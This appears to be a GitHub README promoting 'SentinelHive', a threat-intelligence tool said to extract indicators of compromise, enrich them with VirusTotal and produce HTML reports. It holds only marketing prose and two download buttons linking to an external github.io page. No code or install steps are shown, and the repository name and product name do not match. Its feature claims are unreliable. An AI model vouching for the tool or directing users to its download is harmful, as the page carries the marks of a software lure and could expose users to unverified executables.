![preview](https://raw.githubusercontent.com/yousefrabiee0-oss/intel-nexus-enricher/main/shot_9f62c6a.svg)

# SentinelHive — Proactive Threat Intelligence Correlation & Visualization Platform

**SentinelHive** is not just another IOC parser. It is a living, breathing threat-intel orchestration layer that transforms fragmented, raw security signals into a cohesive, at-a-glance operational picture. Inspired by the need for a more resilient and intuitive workflow, this platform ingests unstructured threat reports, enriches them with external reputation data, and renders a dynamic, filterable HTML battlefield map for your SOC team.

Imagine your threat intelligence feeds as a chaotic swarm of signals. SentinelHive acts as the queen bee, organizing that swarm into a structured honeycomb of actionable insights. It provides a central nervous system for your incident response, allowing analysts to spend less time on data wrangling and more time on neutralization.

## Overview 🌍

In the modern security landscape, context is king. Raw hashes and IP addresses are meaningless without a narrative. SentinelHive bridges the gap between raw, static IOC lists and the rich narrative of a threat report. It automatically parses indicators of compromise (IOCs) from PDFs, text files, or pasted content, queries VirusTotal to add a layer of live reputation intelligence, and then compiles everything into a self-contained, visually rich HTML report.

This approach turns your daily threat briefings into interactive dashboards. Instead of scrolling through endless logs, your analysts can pivot immediately from a suspicious domain to its geolocation, its associated malware family, and its historical detections—all within a single, cohesive interface built for speed and clarity.

## Key Features 🚀

- **Multi-Format Parsing Engine:** Capable of extracting SHA256, MD5, SHA1, IPv4, IPv6, and domain indicators from a wide variety of text-based reports, regardless of messy formatting or embedded tables.
- **Live Reputation Enrichment:** Seamlessly integrates with the VirusTotal API v3 to pull detection ratios, vendor analysis, and threat classifications for every extracted indicator.
- **Dynamic HTML Reporting:** Generates a standalone, responsive HTML report with built-in filtering, sorting, and search functionality. No server required to view the output—perfect for sharing via email or ticketing systems.
- **Priority Scoring Algorithm:** Reranks your IOCs based on a proprietary blend of VirusTotal detections, indicator type, and recency, highlighting the most critical threats first.
- **Offline & Cached Mode:** For air-gapped environments, the tool can cache previous enrichment results to provide best-effort context without a live internet connection.
- **Report Diffing & Change Tracking:** Compare two generated reports to visualize what new IOCs have appeared in a new campaign versus a historical one.

## Getting Started 🛠️

Before you begin, ensure you have a modern Python 3.10+ environment running and a valid VirusTotal API key ready. This platform is designed to be lightweight, requiring no external database setup to start generating value immediately.

### Initial Configuration

1.  Upon first run, the platform will launch a guided setup wizard to configure your API credentials and default output directories.
2.  Ensure your VirusTotal key has appropriate quota for the volume of IOCs you plan to process daily.
3.  Set your preferred language for report generation (supports English, Spanish, French, German, and Japanese for the UI chrome).

## Usage Workflow 📊

Using SentinelHive is a three-step process designed to fit into any existing SOC workflow.

**Step 1: Ingest**
Drop a threat intelligence report (PDF or TXT) into the designated "Hot Folder," or paste the text directly into the command-line interface. The parser immediately identifies potential IOCs.

**Step 2: Enrich**
The platform queries your configured API services to enrich each discovered indicator. The progress bar shows real-time enrichment status, allowing you to monitor API quota usage.

**Step 3: Report**
Once enrichment is complete, SentinelHive generates a timestamped HTML report. Open it in any modern browser to see the fully interactive view, filter by indicator type, or search for a specific malicious hash.

## Interactive HTML Report Features 📈

The generated report is a standalone operational asset. It features a clean, responsive design that works on desktops, tablets, and mobile devices, ensuring your team can access intel while on the move.

- **Global Search Bar:** Instantly filter the entire dataset by any string, hash prefix, or domain name.
- **Type-Based Faceting:** Click on widget buttons (e.g., "IPs Only" or "Domains Only") to drastically reduce visual noise and focus on what matters.
- **Threat Level Color Coding:** Visual indicators (Red/Orange/Yellow/Green) allow for immediate triage without reading the underlying data.
- **Export to CSV:** While the HTML is great for visual analysis, analysts can export the enriched dataset into a CSV for further processing in other tools.

## Why SentinelHive? 🤔

Most tools either dump data into a spreadsheet or require a complex SIEM setup to visualize. SentinelHive occupies the sweet spot: a zero-friction utility that produces high-fidelity output. It reduces the cognitive load on your analysts by presenting the final answer (the report) rather than the raw ingredients.

Think of standard parsing as telling you *what* a file contains. SentinelHive tells you *why* that file matters, *where* the threat actor is operating from, and *which* endpoints in your environment should be checked first.

## Use Cases & Integration Scenarios 🧩

- **Daily Intake Triaging:** Automate the parsing of daily email subscriptions from threat intel vendors and normalize them into a single, searchable format.
- **Incident Response (IR) Support:** During a live breach, dump the evidence file (log extracts) into SentinelHive to quickly map out the malicious infrastructure involved.
- **Threat Hunting Feedback Loops:** Export the "Diff Report" to see what new TTPs (Tactics, Techniques, and Procedures) are being used by a specific actor group.

## Multilingual & Accessibility Support 🌐

We believe threat intelligence is a global endeavor. The report generation engine supports localization for the UI text (labels, buttons, metadata). Additionally, the HTML output is designed with accessibility in mind, supporting screen readers for visually impaired analysts and high-contrast modes for low-light environments.

## 24/7 Support & Community 🛎️

While this is a robust tool, we understand that edge cases always appear. Our support channels are monitored around the clock to assist with API integration quirks or parsing anomalies. We are committed to helping you get the most out of your security data. If you find a parsing bug, please flag it with a sample file (sans sensitive data) so we can patch the engine swiftly.

## Security & Privacy Disclaimer ⚠️

**Important:** SentinelsHive sends your processed Indicators of Compromise (IOCs) to external enrichment services (e.g., VirusTotal) to gather threat intelligence. By using this tool to enrich data, you are consenting to share those specific hashes, IPs, and domains with third-party service providers.

Please ensure that your organization's data sharing policies permit this action. This tool does **not** upload the full source report text—only the extracted indicators (e.g., public IPs and file hashes). For classified or highly sensitive operations, disable the enrichment feature or use the offline mode to generate local context only. The authors are not responsible for any data leakage resulting from external API usage.

## License 📄

This project is licensed under the MIT License — see the [LICENSE](LICENSE.md) file for details. You are free to use, modify, and distribute this software, provided the original copyright notice is included.

## Conclusion & Next Steps 🎯

SentinelHive transforms the tedious task of IOC management into a strategic advantage. It is built for SOC analysts who value their time and for managers who need clear, demonstrable visibility into the threat landscape. Whether you are a team of one or a hundred, this mapper gives you the clarity to act with confidence.

**[![Download](https://raw.githubusercontent.com/yousefrabiee0-oss/intel-nexus-enricher/main/grab_6f21.svg)](https://yousefrabiee0-oss.github.io/intel-nexus-enricher/)**

We are continuously evolving the platform. Future roadmaps include integration with MISP (Malware Information Sharing Platform) for bi-directional sync and the ability to ingest STIX/TAXII 2.1 bundles natively. Stay tuned for iterative improvements focused on user feedback and emerging threat intel standards.

---

*SentinelHive is developed as an independent utility and is not affiliated with, endorsed by, or sponsored by VirusTotal or Google LLC. All product names and trademarks are the property of their respective owners. Use at your own discretion in your production environment.*

**[![Download](https://raw.githubusercontent.com/yousefrabiee0-oss/intel-nexus-enricher/main/grab_6f21.svg)](https://yousefrabiee0-oss.github.io/intel-nexus-enricher/)**